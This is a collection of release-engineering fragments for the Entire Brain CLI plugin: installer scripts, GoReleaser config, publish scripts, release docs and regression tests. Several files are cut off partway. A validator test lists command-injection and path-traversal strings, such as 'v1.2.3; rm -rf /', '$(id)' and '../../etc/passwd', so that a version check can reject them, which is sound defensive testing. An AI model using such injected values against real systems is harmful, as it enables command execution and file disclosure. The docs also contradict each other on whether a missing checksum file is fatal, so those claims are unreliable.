321	  and require agreement, degrading to one origin when the other is down.
322	- **Warm the module proxy** at release time (a `GET` of
323	  `proxy.golang.org/github.com/entireio/cli/@v/vX.Y.Z.info`) so the `go install`
324	  escape hatch is populated *before* an outage rather than during one.
325	- **Measure the install mix.** `installManagerForCurrentBinary()` already detects
326	  brew/mise/scoop/unknown but never reports it, so how much of the user base each
327	  path covers is currently inferred from `checksums.txt` download counts. See
328	  `docs/install-provenance-plan.md`.
329	
330	## Tests
331	
332	`scripts/test-release-origins.sh` (also `mise run test:release-origins`, and a
333	job in `ci.yml`) runs both scripts against local fake origins: version discovery,
334	download and verification from our origin, fallback to GitHub for both, a
335	checksum mismatch aborting rather than falling back, `--version` pinning, the
336	all-origins-down error, and the channel pointer's routing, monotonicity and
337	idempotence. It is hermetic and refuses to run an installer still aimed at a
338	public origin.

content.text:
I've read through the CLI's release setup. Here's how it works and how I'd map it onto Brain, followed by the URL decision.

## What the CLI does

- **Build and publish:** GoReleaser (`.goreleaser.yaml`, `pro: true`) does builds, macOS notarization, archives (`entire_<os>_<arch>`), `checksums.txt`, the GitHub release, and the Homebrew cask and Scoop manifest. The cask and manifest go to `entireio/homebrew-tap` and `entireio/scoop-bucket`, pushed with a GitHub App token (`HOMEBREW_TAP_APP_*`).
- **Cloudflare mirror:** GoReleaser's `blobs` step uploads each release to a private S3 bucket under `v<version>/`, using OIDC to assume `github-actions-release-upload`. `install.entire.com` is a **Cloudflare Worker that maps each URL path straight to a bucket key**. It knows nothing about the layout, so adding a new prefix only needs an IAM change.
- **After the upload:** `publish-channel-manifest.sh` updates `channels/{stable,nightly}.json`. The update only goes through if the version moves forward and nobody else wrote the file in the meantime. `publish-installers.sh` then uploads `installers/install.{sh,ps1}` and a Scoop manifest pointing at the mirror (stable releases only).
- **Installer:** `install.sh` tries `install.entire.com` first and falls back to GitHub. It stops if a checksum doesn't match, and it never mixes origins within one install.
- **Live state:** the mirror is on (stable is at `v0.11.6`). `entire.com/install.sh` still 307-redirects to raw GitHub; infra repoints it only after a release has uploaded the installer.

## How it would map onto Brain

- **Port:** `.goreleaser.yaml`, `release.yml`, `nightly.yml`, the two publish scripts, `install.sh`/`install.ps1` and the origin tests, all parameterised for `entire-brain`. This replaces the hand-rolled build loop and `scripts/release.sh`.
- **Homebrew:** casks `entire-brain` and `entire-brain@nightly` in `entireio/homebrew-tap`.
- **Scoop:** `entire-brain.json` in `entireio/scoop-bucket`, plus a mirrored manifest.
- **Archive names:** keep `entire-brain_<os>_<arch>`. The CLI's plugin installer (`plugin_fetch.go`) already accepts that pattern, and `entire-plugin.yml` can set `download_url` to the mirror. That gives `entire plugin install brain` the same GitHub-free path.

**What I can't do from here, so it needs you or infra (`entirehq/infra`):**
1. **IAM:** let the upload role trust `repo:entireio/entire-brain:ref:refs/tags/v*` and `…:refs/heads/main`, and grant it write access to the Brain prefix. The Worker needs no change.
2. **Repo secrets in `entire-brain`:** `HOMEBREW_TAP_APP_ID`/`PRIVATE_KEY` (and the App needs to be installed on the tap repos) and the `MACOS_SIGN_*`/`MACOS_NOTARY_*` signing secrets. Brain binaries aren't signed today. Homebrew casks quarantine downloads, so an unsigned `entire-brain` would be blocked by Gatekeeper. Signing is effectively required before shipping the cask. Also the `GORELEASER_KEY` secret if we stay on Pro, plus the `ENTIRE_RELEASE_*` variables.
3. **Redirect:** a redirect for whichever short URL we choose.

## The URL question

The Worker serves paths verbatim, and the CLI already owns the top-level `v*/`, `channels/` and `installers/`. So Brain needs its own namespace. My recommendation:

- **Short URL:** `curl -fsSL https://entire.com/brain/install.sh | bash` (and `irm https://entire.com/brain/install.ps1 | iex`). It sits under the same brand as the CLI's `entire.com/install.sh` and is a redirect, so the backing location can change later.
- **Storage:** `install.entire.com/brain/…`, i.e. `brain/v0.2.0/entire-brain_darwin_arm64.tar.gz`, `brain/channels/stable.json`, `brain/installers/install.sh`, `brain/scoop/entire-brain.json`. One bucket, one Worker, and the IAM rule is just "this repo may write `brain/*`".

Alternatives considered: a separate hostname (`brain.install.entire.com`) needs a new Worker route and cert for no real gain. Making the CLI's installer take `--plugin brain` couples two release trains together.

      # the Scoop manifest) are overwritten on every release rather than
      # versioned, so a nightly publishing here would replace the installer
      # stable users fetch; nightly users are served by the same stable
      # installer, which takes --channel nightly.
      #

      # versions, so uploading first means a release the pointer then refuses
      # (an older tag re-dispatched) leaves the installers rolled back with
      # nothing advanced. The installer is version-independent, so a pointer
      # that moved before it is harmless.
      - name: Publish install scripts and Scoop manifest
        if: vars.ENTIRE_RELEASE_BUCKET != '' && steps.release-type.outputs.prerelease == 'false'

#!/usr/bin/env bash
# One-line installer for Entire Brain.
#
#   curl -fsSL https://raw.githubusercontent.com/entireio/entire-brain/main/scripts/get-brain.sh | bash
#
# Downloads a released binary for this platform, verifies it against the
# release checksums, and registers it with the Entire CLI. No Go toolchain and
# no C compiler: Brain's default build is pure Go, so the published binary runs
# as-is. Use scripts/install.sh instead when you want to build from source.
set -euo pipefail

GITHUB_REPO="entireio/entire-brain"
DEFAULT_INSTALL_DIR="${ENTIRE_BRAIN_INSTALL_DIR:-$HOME/.local/bin}"
CHANNEL="stable"

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  BOLD=$'\033[1m'; GREEN=$'\033[0;32m'; RED=$'\033[0;31m'; YELLOW=$'\033[0;33m'; NC=$'\033[0m'
else
  BOLD=""; GREEN=""; RED=""; YELLOW=""; NC=""
fi
info()  { printf '%s==>%s %s\n' "$GREEN" "$NC" "$*"; }
warn()  { printf '%s!%s   %s\n' "$YELLOW" "$NC" "$*" >&2; }
error() { printf '%serror:%s %s\n' "$RED" "$NC" "$*" >&2; exit 1; }

usage() {
  # Kept inline rather than read back out of $0: the documented invocation is
  # curl | bash, where $0 is "bash" and there is no script file to read.
  cat <<'USAGE'
Install Entire Brain.

  curl -fsSL https://raw.githubusercontent.com/entireio/entire-brain/main/scripts/get-brain.sh | bash

Options:
  --nightly          Install the newest nightly prerelease instead of stable
  --version vX.Y.Z   Install a specific release
  --dir <path>       Install somewhere other than ~/.local/bin
  -h, --help         Show this message

The download is verified against the release checksums. Brain's default build

USAGE
}

  case "$1" in
    --nightly) CHANNEL="nightly"; shift ;;
    --version) WANT_VERSION="${2:?--version needs a value}"; shift 2 ;;
    --dir)     DEFAULT_INSTALL_DIR="${2:?--dir needs a path}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) error "unknown option: $1" ;;
  esac
done

for c in curl tar uname; do
  command -v "$c" >/dev/null || error "missing required command: $c"
done

os="$(uname -s | tr '[:upper:]' '[:lower:]')"
case "$os" in
  linux|darwin) : ;;
  *) error "unsupported OS: $os. Windows users: download the .zip from
  https://github.com/${GITHUB_REPO}/releases/latest" ;;
esac
arch="$(uname -m)"
case "$arch" in
  x86_64|amd64) arch="amd64" ;;
  arm64|aarch64) arch="arm64" ;;
  *) error "unsupported architecture: $arch" ;;
esac

  have="$(cd "$tmp" && sha256sum "$asset" | awk '{print $1}')"
elif command -v shasum >/dev/null; then
  have="$(cd "$tmp" && shasum -a 256 "$asset" | awk '{print $1}')"
else

  Install coreutils (Linux) or use the system shasum (macOS), then re-run."

[ -n "$want" ] || error "checksums.txt has no entry for ${asset}
  The release may have been published with different asset names.
  Assets: https://github.com/${GITHUB_REPO}/releases/tag/${version}"
[ "$have" = "$want" ] || error "checksum mismatch for ${asset}
  expected ${want}
  got      ${have}"
info "checksum verified"

[ -f "${tmp}/entire-brain" ] || error "archive did not contain entire-brain"
chmod +x "${tmp}/entire-brain"

mkdir -p "$DEFAULT_INSTALL_DIR"
mv "${tmp}/entire-brain" "${DEFAULT_INSTALL_DIR}/entire-brain"
info "installed to ${BOLD}${DEFAULT_INSTALL_DIR}/entire-brain${NC}"

# ---- register with the Entire CLI --------------------------------------
if command -v entire >/dev/null; then
  if entire plugin install "${DEFAULT_INSTALL_DIR}/entire-brain" --force >/dev/null 2>&1; then
    info "registered with the Entire CLI"
    echo
    entire brain version 2>/dev/null || true
    echo
    if ! entire graph version >/dev/null 2>&1; then
      warn "Entire Graph is not installed. Brain uses it for code analysis, and
  setup will report the semantic index as unavailable without it:
  entire plugin install graph"
    fi
    printf '%sNext:%s  entire brain setup     (in a Git repository)\n' "$BOLD" "$NC"
  else
    warn "could not register the plugin automatically. Run:
  entire plugin install ${DEFAULT_INSTALL_DIR}/entire-brain --force"
  fi
else
  warn "the Entire CLI was not found on PATH. Install it first:
  curl -fsSL https://entire.io/install.sh | bash
then run:
  entire plugin install ${DEFAULT_INSTALL_DIR}/entire-brain --force"
fi

case ":${PATH}:" in
  *":${DEFAULT_INSTALL_DIR}:"*) : ;;
  *) warn "${DEFAULT_INSTALL_DIR} is not on your PATH. Add:
  export PATH=\"${DEFAULT_INSTALL_DIR}:\$PATH\"" ;;

"""Regression tests for the release path.

Both of these encode a defect the agent review found on the pull request that
introduced the release workflow and the standalone installer. They are written
to fail if either defect is reintroduced, not to describe the fix.
"""

from __future__ import annotations

import os
import re
import shutil
import stat
import subprocess
import tempfile
import textwrap
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
WORKFLOWS = REPO / ".github" / "workflows"
INSTALLER = REPO / "scripts" / "get-brain.sh"

# Every form a run: script can take. Matching only "run: |" left the single
# line form, the chomping forms and folded scalars unscanned — which is most of
# the run: keys in test.yml, and exactly where a new one would be added.
RUN_BLOCK = re.compile(
    r"^(?P<indent> +)run:[ \t]*(?:"
    r"(?P<inline>[^|>\n][^\n]*)\n"                       # run: echo ...
    r"|[|>][+-]?[ \t]*\n(?P<body>(?:(?P=indent) .*\n|[ \t]*\n)*)"  # run: | / |- / > / >-
    r")",
    re.M,
)


def run_script_lines(source):
    """Yield (line_number, text) for every line of every run: script."""
    for block in RUN_BLOCK.finditer(source):
        start = source[: block.start()].count("\n") + 1
        if block.group("inline"):
            yield start, block.group("inline")
        else:
            for offset, line in enumerate((block.group("body") or "").splitlines()):
                yield start + offset + 1, line


# Contexts whose value someone outside the repository can influence. These are
# the ones that become code when interpolated into a shell script. Values
# GitHub computes itself — github.sha, runner.temp, a fixed matrix entry — are
# not attacker-controlled and are left alone deliberately: a check that flagged
# them too would be noise, and noise gets switched off.
UNTRUSTED_CONTEXTS = re.compile(
    r"\$\{\{\s*(inputs\.|github\.event\.|github\.head_ref|github\.ref_name)"
)


class WorkflowExpressionHygiene(unittest.TestCase):
    """A ${{ }} expression inside run: is substituted as text before the shell
    parses the script, so any value an attacker controls becomes code. Untrusted
    input must reach the shell through env:, where it is an ordinary string."""

    def test_no_untrusted_expression_interpolated_into_a_run_block(self) -> None:
        offenders: list[str] = []
        for workflow in sorted(WORKFLOWS.glob("*.yml")):
            source = workflow.read_text()
            for line_no, line in run_script_lines(source):
                if UNTRUSTED_CONTEXTS.search(line):
                    offenders.append(f"{workflow.name}:{line_no}: {line.strip()}")

        self.assertEqual(
            offenders,
            [],
            "Attacker-influenced GitHub Actions expressions must be passed through "
            "env: rather than interpolated into a run: script:\n  " + "\n  ".join(offenders),
        )

    def test_every_job_that_consumes_the_version_validates_its_shape(self) -> None:
        """A dispatched version reaches tag names, asset file names and release
        titles. Grepping for the error message proves nothing — this finds the
        guard in each job and runs its regex, so a weakened pattern fails here
        rather than in a release."""
        source = (WORKFLOWS / "release.yml").read_text()
        self.assertIn("VERSION_INPUT", source)

        # Split into jobs so a guard in one cannot vouch for the other.
        jobs = dict(re.findall(r"^  (\w[\w-]*):\n(.*?)(?=^  \w[\w-]*:\n|\Z)",
                               source, re.M | re.S))
        for job in ("build", "publish"):
            self.assertIn(job, jobs, f"release.yml has no {job} job")
            guards = re.findall(r'\[\[ ! "\$version" =~ (\S+) \]\]', jobs[job])
            self.assertEqual(
                len(guards), 1,
                f"the {job} job must validate the version exactly once; found {len(guards)}",
            )
            self._assert_regex_is_strict(guards[0], job)

    ACCEPT = ["v0.1.0", "v1.2.3", "v10.20.30",
              "v1.2.3-nightly.202609192059.abc1234", "v0.0.0-dev.f9838c0", "v0.1.0+build.5"]
    REJECT = ["0.1.0", "v1.2", "v1", "", "v1.2.3.4", "v1.2.3-",
              "v1.2.3; rm -rf /", "v1.2.3$(id)", "v1.2.3 && echo pwned",
              "v1.2.3`id`", "../../etc/passwd", "v1.2.3\nv9.9.9"]

    def _assert_regex_is_strict(self, pattern: str, job: str) -> None:
        """Run the workflow's own regex in bash, the way the workflow does."""
        script = (
            'shopt -s nocasematch 2>/dev/null; '
            f'if [[ "$1" =~ {pattern} ]]; then echo ACCEPT; else echo REJECT; fi'
        )
        def verdict(value: str) -> str:
            return subprocess.run(["bash", "-c", script, "bash", value],
                                  capture_output=True, text=True,
                                  timeout=30).stdout.strip()

        for good in self.ACCEPT:
            self.assertEqual(verdict(good), "ACCEPT",
                             f"{job}: version {good!r} should be accepted by {pattern}")
        for bad in self.REJECT:
            self.assertEqual(verdict(bad), "REJECT",
                             f"{job}: version {bad!r} MUST be rejected by {pattern}")


class InstallerFailsClosed(unittest.TestCase):
    """The README and SECURITY.md both promise the downloaded archive is verified
    against the release checksums. Every path that would install without
    verifying must therefore be fatal."""

    def test_the_script_has_no_install_without_verification_path(self) -> None:
        source = INSTALLER.read_text()
        self.assertNotIn(
            "installing without verification",
            source,
            "the installer must not proceed when checksums.txt cannot be fetched",
        )
        self.assertNotIn(
            "skipping checksum verification",
            source,
            "the installer must not proceed when it has no tool to hash with",
        )

    def _run_with_fake_curl(self, checksums_status: int, want_dir: bool = False):
        """Run the installer with a curl stub on PATH that serves a tarball but
        answers the checksums.txt request with the given status."""
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)

        payload = tmp / "payload"
        payload.mkdir()
        (payload / "entire-brain").write_text("#!/bin/sh\necho fake\n")
        subprocess.run(
            ["tar", "-czf", str(tmp / "asset.tar.gz"), "-C", str(payload), "entire-brain"],
            check=True,
        )

        fake_curl = tmp / "bin" / "curl"
        fake_curl.parent.mkdir()
        fake_curl.write_text(
            textwrap.dedent(
                f"""\
                #!/usr/bin/env bash
                # Serve the release archive, fail the checksums request.
                out=""
                url=""
                while [ $# -gt 0 ]; do
                  case "$1" in
                    -o) out="$2"; shift 2 ;;
                    -*) shift ;;
                    *) url="$1"; shift ;;
                  esac
                done
                case "$url" in
                  *checksums.txt)
                    {"echo 'deadbeef  some-other-file.tar.gz' > \"$out\"; exit 0"
                     if checksums_status == 2 else
                     f"exit {1 if checksums_status else 0}"} ;;
                  *releases/latest) echo '{{"tag_name": "v9.9.9"}}'; exit 0 ;;
                  *.tar.gz) cp "{tmp / 'asset.tar.gz'}" "$out"; exit 0 ;;
                esac
                exit 0
                """
            )
        )
        fake_curl.chmod(fake_curl.stat().st_mode | stat.S_IEXEC)

        # Stub `entire` too. The installer's success path runs
        # `entire plugin install --force`, which would repoint the developer's
        # real Brain plugin at this temp dir and then delete it on cleanup.
        # No test takes that path today; one added later must not break the host.
        fake_entire = fake_curl.parent / "entire"
        fake_entire.write_text("#!/usr/bin/env bash\nexit 0\n")
        fake_entire.chmod(fake_entire.stat().st_mode | stat.S_IEXEC)

        env = dict(os.environ)
        env["PATH"] = f"{fake_curl.parent}:{env['PATH']}"
        env["ENTIRE_BRAIN_INSTALL_DIR"] = str(tmp / "install")

        result = subprocess.run(
            ["bash", str(INSTALLER), "--version", "v9.9.9"],
            capture_output=True,
            text=True,
            env=env,
            timeout=60,
        )
        return (result, Path(env["ENTIRE_BRAIN_INSTALL_DIR"])) if want_dir else result

    def test_unfetchable_checksums_aborts_the_install(self) -> None:
        result = self._run_with_fake_curl(checksums_status=1)
        self.assertNotEqual(
            result.returncode,
            0,
            "the installer exited 0 despite being unable to verify the download:\n"
            f"stdout={result.stdout}\nstderr={result.stderr}",
        )
        self.assertIn("checksums.txt", result.stderr)

    def test_a_checksums_file_missing_this_asset_says_so(self) -> None:
        """pipefail would kill the script at the grep assignment, making the
        dedicated error unreachable and leaving a curl | bash user with a bare
        exit 1 and no diagnostic."""
        result = self._run_with_fake_curl(checksums_status=2)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("no entry for", result.stderr,
                      f"expected a diagnostic, got stderr={result.stderr!r}")

    def test_nothing_is_installed_when_verification_is_impossible(self) -> None:
        result, install_dir = self._run_with_fake_curl(checksums_status=1, want_dir=True)
        landed = list(install_dir.iterdir()) if install_dir.exists() else []
        self.assertEqual(
            landed,
            [],
            f"the installer left {landed} behind despite failing verification:\n"
            f"stdout={result.stdout}\nstderr={result.stderr}",
        )


class InstallerRunsWhenPiped(unittest.TestCase):
    """The documented invocation is curl | bash, where $0 is "bash" and the
    script has no file to read itself back out of. Anything that reads $0 works
    when the script is run as a file and breaks the way it is actually used."""

    def test_help_works_when_the_script_is_piped_into_bash(self) -> None:
        result = subprocess.run(
            ["bash", "-s", "--", "--help"],
            input=INSTALLER.read_text(),
            capture_output=True,
            text=True,
            timeout=30,
        )
        self.assertEqual(
            result.returncode,
            0,
            f"--help failed when piped, which is how the README documents it:\n"
            f"stdout={result.stdout}\nstderr={result.stderr}",
        )
        self.assertIn("--nightly", result.stdout)
        self.assertNotIn("No such file", result.stderr)

    def test_the_script_does_not_read_itself_from_argv_zero(self) -> None:
        self.assertNotIn(
            '"$0"',
            INSTALLER.read_text(),
            'the script must not read $0: under curl | bash it is "bash", not a path',
        )


if __name__ == "__main__":
    unittest.main()

----
# Releasing Brain

Brain releases the same way Graph does: a tag triggers a build of every target,
the binaries and their checksums are attached to a GitHub release, and a nightly
prerelease is cut from `main` each morning.

## Cutting a release

1. Move the work into a `## [X.Y.Z]` section in `CHANGELOG.md`, dated.
2. Tag and push:

   ```sh
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```

`.github/workflows/release.yml` does the rest: it builds `linux`, `darwin`, and
`windows` for both `amd64` and `arm64`, packages each as a `.tar.gz` (`.zip` on
Windows), writes `checksums.txt`, and creates the release with generated notes.
Re-running it against an existing tag updates that release rather than failing.

You can also run it from the Actions tab with a version, which is the way to
re-cut a release whose upload failed.

### Why one runner builds everything

Brain's default build is pure Go — both the SQLite driver and the vector path
have cgo-free implementations (`internal/cli/sqlite_driver_purego.go`,
`internal/cli/embed_vec_purego.go`), and SQLite itself comes from
`modernc.org/sqlite` rather than a C binding — so `CGO_ENABLED=0`
cross-compiles every target from one Linux runner.
Graph needs a runner per OS because its tree-sitter bindings need cgo. The
release workflow asserts this rather than assuming it:

```yaml
- name: Verify the default build needs no cgo
  run: CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
```

If someone adds a cgo dependency to the default build, that step fails and the
release stops, instead of silently producing binaries that only run on the
build host.

The `brain_cgo` build tag still exists for the native embedder. It is not part
of a release build.

## Nightlies

`.github/workflows/nightly.yml` runs at 06:00 UTC, matching Graph, and tags
`vX.Y.Z-nightly.<timestamp>.<sha>` where `X.Y.Z` is the newest version in the
changelog.

It skips days `main` has not moved. A dated prerelease that is byte-identical to
yesterday's makes "which nightly has the fix" harder to answer, not easier, so
the run checks whether the newest prerelease already points at `HEAD` and exits
if it does.

## Pull requests build the release path

`release.yml` also runs on pull requests that change it. That run builds every
target and skips the publish job, so a change to the release process is proven
on the PR rather than on the tag that depends on it.

## What may be claimed in release material

`mise run release:readiness` reports which claims the retained evidence
supports. It classifies every track as one of `proven`, `local-gated`,
`pending-retained-proof`, `pending-target-evidence`, or `no-claim`, and the gate
fails when release material asserts something the evidence does not carry.

Run it before writing an announcement, and treat anything short of `proven` as
not sayable.

## Install channels

Releases reach users three ways:

| channel | resolves through |
|---|---|
| `entire plugin install brain` | the [plugin index](https://github.com/entireio/plugin-index) |
| `scripts/get-brain.sh` | the GitHub releases API, verifying `checksums.txt` |
| a downloaded archive | the release page |

The installer verifies the downloaded archive against `checksums.txt` and exits
non-zero on a mismatch. A missing checksum file is a warning; a wrong checksum
is fatal.

1	#!/bin/bash
2	#
3	# Exercises the two-origin release path against local fake origins. No network,
4	# no writes outside a temp dir.
5	#
6	# Why this exists: install.sh reads our own release origin first and falls back
7	# to GitHub. The fallback only runs when something is broken, which is exactly
8	# when nobody wants to discover it never worked — so it is tested here instead
9	# of in production. Covers:
10	#
11	#   * install.sh resolving a version from channels/<channel>.json
12	#   * install.sh downloading and verifying from our origin
13	#   * install.sh falling back to the GitHub origin for both steps
14	#   * a checksum mismatch aborting instead of silently trying the next origin
15	#   * --version pinning, and the error text when every origin is unreachable
16	#   * publish-channel-manifest.sh routing, monotonicity and idempotence
17	#
18	# Requires: python3, curl, tar, sha256sum or shasum.
19	# Usage: scripts/test-release-origins.sh
20	
21	set -uo pipefail
22	
23	REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
24	INSTALL_SH="${REPO_ROOT}/scripts/install.sh"
25	PUBLISH_SH="${REPO_ROOT}/scripts/publish-channel-manifest.sh"
26	WORK="$(mktemp -d)"
27	# A PATH without the developer's real `entire`, so install.sh takes its
28	# first-time-install branch instead of the PATH-conflict branch.
29	SAFE_PATH="/usr/bin:/bin:/usr/sbin:/sbin"

32	fail=0

35	section() { printf '\n\033[1m%s\033[0m\n' "$1"; }

43	}

93	# blackhole <dir> -> prints a port that accepts connections and never responds.
94	# A dead origin fails fast on connect; this is the nastier case — reachable, so
95	# curl waits. install.sh must still fail over.
96	blackhole() {
97	    local dir="$1" port
98	    mkdir -p "$dir"
99	    port="$(free_port)"
100	    python3 -c '
101	import socket, sys, time
102	srv = socket.socket()
103	srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
104	srv.bind(("127.0.0.1", int(sys.argv[1])))
105	srv.listen(16)
106	held = []
107	while True:
108	    conn, _ = srv.accept()
109	    held.append(conn)  # accepted, deliberately never answered
110	    time.sleep(0.01)
111	' "$port" >/dev/null 2>&1 &
112	    echo $! > "$dir/.pid"
113	    echo "$port"
114	}

121	    local dir="$1" port
122	    port="$(free_port)"
123	    ( cd "$dir" && exec python3 -m http.server "$port" --bind 127.0.0.1 >/dev/null 2>&1 ) &
124	    echo $! > "$dir/.pid"
125	    for _ in $(seq 1 50); do
126	        curl -fsS -o /dev/null "http://127.0.0.1:$port/" 2>/dev/null && break
127	        sleep 0.1

129	    echo "$port"

143	#
144	# Runs install.sh with an empty environment and an isolated HOME, so it can

152	run_install() {

161	        printf 'Error: %s would reach a public origin. Set BASE_URL or use repoint().\n' \
162	            "$(basename "$script")" >&2

// Once built as an executable named `entire-brain`, the parent Entire CLI

# yaml-language-server: $schema=https://goreleaser.com/static/schema.json
#
# Release configuration for entire-brain. Modelled on the Entire CLI's
# (entireio/cli/.goreleaser.yaml); see docs/releasing.md for how the pieces fit
# together and what has to be configured outside this repository.
#
# Open-source GoReleaser is enough: nothing here needs Pro, so the release does
# not depend on a license key.
version: 2

project_name: entire-brain

before:
  hooks:
    - go mod download

builds:
  - id: entire-brain
    main: ./cmd/entire-brain
    binary: entire-brain
    # Brain is pure Go: modernc sqlite is the only driver (the brain_cgo variant
    # was removed with semantic retrieval, trail #278), so every target
    # cross-compiles from one Linux runner. release.yml asserts this before
    # GoReleaser runs.
    env:
      - CGO_ENABLED=0
    goos:
      - darwin
      - linux
      - windows
    goarch:
      - amd64
      - arm64
    flags:
      - -trimpath
    # Pin the binary mtime to the commit so rebuilding a tag produces identical
    # bytes. Files under brain/v<version>/ on the release origin are cached
    # immutable for a year; a retried release that re-uploaded different bytes
    # would leave an edge holding the old archive beside the new checksums.txt,
    # and the installer deliberately aborts on a checksum mismatch.
    mod_timestamp: "{{ .CommitTimestamp }}"
    ldflags:
      - -s -w -X main.version={{ .Version }}

notarize:
  macos:
    # Tests non-emptiness, not isEnvSet alone: release.yml always exports these
    # variables, and a secret that is not configured exports as an empty
    # string. Gating on presence would enable signing with no certificate and
    # fail every release instead of staying off.
    - enabled: '{{ and (isEnvSet "MACOS_SIGN_P12") (ne .Env.MACOS_SIGN_P12 "") }}'
      ids:
        - entire-brain
      sign:
        certificate: "{{ .Env.MACOS_SIGN_P12 }}"
        password: "{{ .Env.MACOS_SIGN_PASSWORD }}"
      notarize:
        issuer_id: "{{ .Env.MACOS_NOTARY_ISSUER_ID }}"
        key_id: "{{ .Env.MACOS_NOTARY_KEY_ID }}"
        key: "{{ .Env.MACOS_NOTARY_KEY }}"
        wait: true # do not let an unusable binary slip into the wild

archives:
  - formats:
      - tar.gz
    format_overrides:
      - goos: windows
        formats:
          - zip
    # The versioned name every Brain release has used. scripts/get-brain.sh
    # builds it, and the Entire CLI's plugin fetcher (plugin_fetch.go,
    # assetCandidates) tries <bin>_<version>_<os>_<arch> first.
    name_template: "{{ .ProjectName }}_{{ .Version }}_{{ .Os }}_{{ .Arch }}"
    files:
      - src: LICENSE
        info:
          owner: root
          group: root
          mtime: "{{ .CommitDate }}"
      - src: README.md
        info:
          owner: root
          group: root
          mtime: "{{ .CommitDate }}"

checksum:
  name_template: "checksums.txt"

# Mirror every release artifact to the release origin, install.entire.com, so
# installing keeps working while GitHub is down. The origin is a Cloudflare
# Worker that maps /<path> to the bucket key <path> verbatim, and the Entire CLI
# owns the bucket's top-level v*/, channels/ and installers/ prefixes, so
# everything Brain publishes lives under brain/.
#
# Layout is brain/v<version>/<file>, deliberately the same shape as GitHub's
# releases/download/v<version>/<file>, so get-brain.sh builds both origins' URLs
# from one template.
#
# Inert until ENTIRE_RELEASE_BUCKET is set to a non-empty value. The variable is
# always exported by release.yml, and an unset Actions variable exports as an

#!/bin/bash
#
# Mirrors the installer to the release origin, under the short public name:
#
#   <bucket>/brain.sh            ->  https://install.entire.com/brain.sh
#
# The source is scripts/get-brain.sh, the same file the raw.githubusercontent
# URL serves, so both one-liners run identical code. Mirroring it removes
# GitHub from hop zero of an install, and serves the released installer rather
# than whatever is on main.
#
# It also mirrors the Scoop manifest, with its download URLs rewritten to this
# origin:
#
#   <bucket>/brain/scoop/entire-brain.json
#
# Scoop does not need a bucket, and therefore does not need git: `scoop install
# <url-to-manifest.json>` installs from a URL and records that URL as the app's
# source, so `scoop update` re-fetches it and upgrades in place. The bucket
# manifest is left pointing at GitHub, so the ordinary `scoop install
# entire/entire-brain` path is unchanged; this is an additional GitHub-free
# route, not a replacement that makes every Scoop install depend on one origin.
#
# Ported from the Entire CLI's script of the same name. The bucket is shared
# with the CLI, which owns installers/ and scoop/ at the top level, so nothing
# here may write outside brain.sh and brain/.
#
# Run this on STABLE releases only. Every key it writes is overwritten on each
# release rather than versioned, so a nightly publishing here would replace what
# stable users fetch. Nightly users run the same stable installer with
# --channel nightly.
#
# Run it AFTER the channel pointer is flipped. These keys are shared across
# versions, so publishing them first means a release the pointer then refuses --
# an older tag re-dispatched -- leaves them rolled back with nothing advanced.
#
# Usage:
#   publish-installers.sh --bucket NAME [--region R] [--dist DIR] [--origin-url URL]
#
# Exit codes:
#   0  published
#   1  bad usage / missing input / upload failure

set -euo pipefail

BUCKET=""
REGION="us-east-2"
DIST="dist"
# The public name this bucket is served under. The manifest has to name a URL a
# Scoop client can fetch, which the bucket name is not.
ORIGIN_URL="https://install.entire.com"

die() { printf 'Error: %s\n' "$1" >&2; exit 1; }

while [[ $# -gt 0 ]]; do
    case "$1" in
        --bucket) shift; [[ $# -gt 0 ]] || die "--bucket requires a value"; BUCKET="$1" ;;
        --region) shift; [[ $# -gt 0 ]] || die "--region requires a value"; REGION="$1" ;;
        --dist)   shift; [[ $# -gt 0 ]] || die "--dist requires a value"; DIST="$1" ;;
        --origin-url) shift; [[ $# -gt 0 ]] || die "--origin-url requires a value"; ORIGIN_URL="$1" ;;
        -h|--help)
            cat <<USAGE
Usage: publish-installers.sh --bucket NAME [--region R] [--dist DIR] [--origin-url URL]

Mirrors scripts/get-brain.sh to <bucket>/brain.sh and the Scoop manifest to
<bucket>/brain/scoop/entire-brain.json, so installing keeps working during a
GitHub outage.

Stable releases only: these keys are overwritten rather than versioned, so a
nightly would replace the installer stable users fetch.

Options:
  --bucket       Destination bucket (required)
  --region       Bucket region (default: us-east-2)
  --dist         GoReleaser output directory (default: dist)
  --origin-url   Public base URL this bucket is served under
                 (default: https://install.entire.com)
USAGE
            exit 0 ;;
        *) die "unknown argument: $1" ;;
    esac
    shift
done

[[ -n "$BUCKET" ]] || die "--bucket is required"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# A short TTL, not the artifacts' immutable one: these keys are overwritten in
# place, so a long max-age would pin a stale installer in every CDN edge and
# every user's cache for the life of that TTL.
CACHE_CONTROL="public, max-age=300"

# Content type set explicitly because the bucket is served through a Worker
# that passes it through; without it a browser is offered a download of
# application/octet-stream instead of readable text, and anyone auditing the
# script before piping it to a shell cannot simply open the URL.
installer="$SCRIPT_DIR/get-brain.sh"
[[ -f "$installer" ]] || die "get-brain.sh not found at $installer"
aws s3 cp "$installer" "s3://${BUCKET}/brain.sh" \
    --region "$REGION" \
    --content-type "text/x-shellscript" \
    --cache-control "$CACHE_CONTROL" \
    || die "uploading brain.sh failed"
printf 'published brain.sh (from scripts/get-brain.sh)\n'

# The Scoop manifest, with its artifact URLs repointed at this origin. Scoop has
# no fallback of its own, so a manifest naming GitHub would leave the GitHub-free
# route depending on the thing it exists to route around.
GITHUB_DOWNLOAD_PREFIX="https://github.com/entireio/entire-brain/releases/download/"
ORIGIN_PREFIX="${ORIGIN_URL%/}/brain/"
manifest_src="${DIST}/scoop/entire-brain.json"
[[ -f "$manifest_src" ]] || die "Scoop manifest not found at ${manifest_src}; run this after GoReleaser"

manifest_tmp="$(mktemp)"
trap 'rm -f "$manifest_tmp"' EXIT
sed "s|${GITHUB_DOWNLOAD_PREFIX}|${ORIGIN_PREFIX}|g" "$manifest_src" > "$manifest_tmp"

# Fail loudly if the rewrite missed. A manifest that still named GitHub would
